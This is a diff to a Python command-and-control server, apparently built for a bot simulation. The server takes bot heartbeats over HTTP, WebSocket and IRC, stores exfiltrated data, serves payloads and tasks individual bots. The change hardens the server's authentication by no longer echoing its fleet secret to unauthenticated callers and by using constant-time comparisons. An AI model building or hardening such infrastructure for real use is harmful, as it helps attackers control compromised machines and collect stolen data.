@@ -15,8 +15,10 @@ the sim: channel-tagged files, atomic rename claim) with an optional per-bot
 "target" tag so commands reach ONE specific bot. c2ctl (this repo) is the
 operator CLI; console.py serves the dashboard + JSON API.
 
-Auth: every response echoes the configured c2_secret (the bot verifies it).
-Incoming heartbeats with a WRONG secret are logged and never served commands.
+Auth: only responses to requests that AUTHENTICATED echo the configured
+c2_secret (the bot verifies it). Rejects and unknown paths answer with a
+bare ack that never contains the secret (#331/#207) — an unauthenticated
+caller must not be able to read the fleet secret off the wire.
 """
 
 import argparse
@@ -492,6 +494,14 @@ def _request_secret_ok(c2, headers, j):
     return hmac.compare_digest(str(supplied), str(c2.secret))
 
 
+def _secret_matches(c2, supplied):
+    """Constant-time shared-secret compare (#216/#333).
+
+    Every fleet-secret check routes through this so no handler falls back
+    to a short-circuiting `!=` timing oracle."""
+    return hmac.compare_digest(str(supplied or ""), str(c2.secret))
+
+
 def _query_param(path, key):
     """Extract one query param from a raw request path (no decode needed —
     the secret charset is URL-safe)."""
@@ -567,9 +577,13 @@ def handle_http(conn, addr, c2):
             if method == "POST" and (
                     (path == c2.http_path.rstrip("/") and "octet-stream" in ctype)
                     or path.endswith("/upload") or "/upload/" in path):
-                _ingest_upload(c2, body, ip, raw_path,
-                               secret_ok=_request_secret_ok(c2, headers, j))
-                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                secret_ok = _request_secret_ok(c2, headers, j)
+                _ingest_upload(c2, body, ip, raw_path, secret_ok=secret_ok)
+                # #331/#207: reject responses must not carry the secret.
+                resp = {"status": "ok"}
+                if secret_ok:
+                    resp["secret"] = c2.secret
+                http_send(conn, json.dumps(resp))
                 continue
 
             if method == "POST" and path == c2.http_path.rstrip("/"):
@@ -578,12 +592,14 @@ def handle_http(conn, addr, c2):
                 # Secret is verified on HEARTBEATS only — the bot's command
                 # responses do NOT carry a body secret; they authenticate via
                 # _request_secret_ok below (header / ?secret= / body field).
-                if kind == "heartbeat" and secret != c2.secret:
+                # #216/#333: constant-time compare.
+                if kind == "heartbeat" and not _secret_matches(c2, secret):
                     c2.state.add_event("auth_fail",
                                        f"bad secret from {ip} host={j.get('hostname','')}")
                     c2.auth_fail_count += 1  # #195
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
-                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    # #331/#207: unauthenticated caller — no secret echo.
+                    http_send(conn, json.dumps({"status": "ok"}))
                     continue
                 # #167: command responses used to be stored with zero auth —
                 # any host could upsert fake bot rows and inject evidence
@@ -593,7 +609,8 @@ def handle_http(conn, addr, c2):
                                        f"response without secret from {ip}")
                     c2.resp_reject_count += 1  # #195
                     log(f"RESP-REJECT {ip} (no secret)")
-                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    # #331/#207: unauthenticated caller — no secret echo.
+                    http_send(conn, json.dumps({"status": "ok"}))
                     continue
                 c2.state.upsert_bot(j, ip, "http")
                 log(f"HTTP {kind} {ip} host={j.get('hostname','')} tag={j.get('tag','')}")
@@ -615,8 +632,10 @@ def handle_http(conn, addr, c2):
                 continue
 
             if method == "POST" and path.endswith("/exfil"):
-                if j.get("secret") != c2.secret:
-                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                # #216/#333: constant-time compare.
+                if not _secret_matches(c2, j.get("secret")):
+                    # #331/#207: unauthenticated caller — no secret echo.
+                    http_send(conn, json.dumps({"status": "ok"}))
                     continue
                 c2.state.add_exfil(text, ip)
                 log(f"EXFIL {ip} len={len(text)}")
@@ -643,7 +662,8 @@ def handle_http(conn, addr, c2):
                 if not (secret_ok or token_ok):
                     c2.payload_reject_count += 1  # #195
                     log(f"PAYLOAD REJECT {ip} (no secret/token)")
-                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    # #331/#207: unauthenticated caller — no secret echo.
+                    http_send(conn, json.dumps({"status": "ok"}))
                     continue
                 log(f"PAYLOAD auth {ip} ({'token' if token_ok and not secret_ok else 'secret'})")
                 if path == "/bot/token":
@@ -686,7 +706,9 @@ def handle_http(conn, addr, c2):
                     c2.ev(f"C2 PAYLOAD download from {ip}")
                     continue
 
-            http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+            # #331/#207: unknown-path fallthrough is UNAUTHENTICATED —
+            # respond with a bare ack, never the fleet secret.
+            http_send(conn, json.dumps({"status": "ok"}))
     except (socket.timeout, ConnectionError, OSError):
         pass
     finally:
@@ -831,12 +853,14 @@ def handle_ws(conn, addr, c2):
             log(f"WS FRAME {ip}: {text[:200]}")
             c2.ev(f"WS FRAME {ip}: {text[:300]}")
             if j.get("cmd") == "status":
-                if j.get("secret") != c2.secret:
+                # #216/#333: constant-time compare.
+                if not _secret_matches(c2, j.get("secret")):
                     c2.state.add_event("auth_fail",
                                        f"bad ws secret from {ip} host={j.get('hostname','')}")
                     c2.auth_fail_count += 1  # #195
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
-                    ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    # #331/#207: unauthenticated caller — no secret echo.
+                    ws_send_text(conn, json.dumps({"status": "ok"}))
                     continue
                 c2.state.upsert_bot(j, ip, "ws")
                 if c2.is_bot(ip):
@@ -855,6 +879,12 @@ def handle_ws(conn, addr, c2):
                 # logged/ev'd with zero auth — same injection gap as HTTP.
                 c2.resp_reject_count += 1  # #195
                 log(f"WS RESP-REJECT {ip} (no secret)")
+                # #331/#207: rejected frame — bare ack, no secret echo.
+                ws_send_text(conn, json.dumps({"status": "ok"}))
+                continue
+            # Authenticated frame (heartbeat with no queued command, or a
+            # valid command response): the ack echoes the secret so the bot
+            # can verify it came from the real C2.
             ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
     except (socket.timeout, ConnectionError, OSError):
         pass
@@ -986,7 +1016,8 @@ def handle_irc(conn, addr, c2, nick, channel):
                             except (IndexError, json.JSONDecodeError):
                                 hb = {}
                             if hb.get("cmd") == "status":
-                                if hb.get("secret") != c2.secret:
+                                # #216/#333: constant-time compare.
+                                if not _secret_matches(c2, hb.get("secret")):
                                     c2.state.add_event("auth_fail",
                                                        f"bad irc secret from {ip}")
                                     c2.auth_fail_count += 1  # #195
